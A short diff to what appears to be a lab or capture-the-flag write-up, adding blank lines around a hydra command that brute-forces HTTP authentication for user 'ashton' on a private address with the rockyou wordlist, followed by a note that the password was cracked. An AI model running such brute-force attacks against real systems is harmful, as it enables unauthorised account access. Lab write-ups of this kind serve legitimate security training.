@@ -98,9 +98,11 @@ Next, in the "meet our team" section I found an interesting text file with a clu
 
 I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:
 
+
 ```bash
 hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
 ```
+
 
 After 10,143 attempts, the password was cracked:
 
